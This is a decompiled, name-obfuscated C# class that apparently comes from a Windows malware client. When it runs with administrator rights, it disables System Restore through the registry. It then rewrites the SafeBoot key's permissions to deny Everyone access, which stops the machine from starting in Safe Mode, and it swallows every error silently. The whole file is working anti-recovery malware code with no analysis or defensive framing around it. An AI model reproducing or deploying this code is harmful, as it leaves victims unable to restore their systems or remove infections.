using System;
using System.Security.AccessControl;
using System.Security.Principal;
using System.Threading;
using Client.My;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.Win32;
using ns14;

namespace ns7;

public class GClass7
{
	public static void smethod_0()
	{
		try
		{
			if (Class0.smethod_2() && Operators.CompareString(Class0.smethod_6("SB"), (string)null, false) == 0)
			{
				((ServerComputer)MyProject.Computer).get_Registry().SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SystemRestore", "DisableSR", (object)"1", RegistryValueKind.DWord);
				smethod_1(Registry.LocalMachine.OpenSubKey("SYSTEM\\CurrentControlSet\\Control\\SafeBoot", writable: true));
				Thread.Sleep(50);
				Class0.smethod_9("SB", "U3VjY2Vzc2Z1bGx5IFJlYWR5IQ==");
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public static object smethod_1(RegistryKey registryKey_0)
	{
		object result = default(object);
		try
		{
			SecurityIdentifier securityIdentifier = new SecurityIdentifier(WellKnownSidType.WorldSid, null);
			NTAccount nTAccount = securityIdentifier.Translate(typeof(NTAccount)) as NTAccount;
			string identity = nTAccount.ToString();
			RegistrySecurity registrySecurity = new RegistrySecurity();
			registrySecurity.AddAccessRule(new RegistryAccessRule(identity, RegistryRights.ExecuteKey, InheritanceFlags.None, PropagationFlags.None, AccessControlType.Deny));
			registrySecurity.AddAccessRule(new RegistryAccessRule(identity, RegistryRights.Delete | RegistryRights.ChangePermissions | RegistryRights.TakeOwnership, InheritanceFlags.None, PropagationFlags.None, AccessControlType.Deny));
			registryKey_0.SetAccessControl(registrySecurity);
			registryKey_0.Close();
			return result;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
			return result;
		}
	}
}
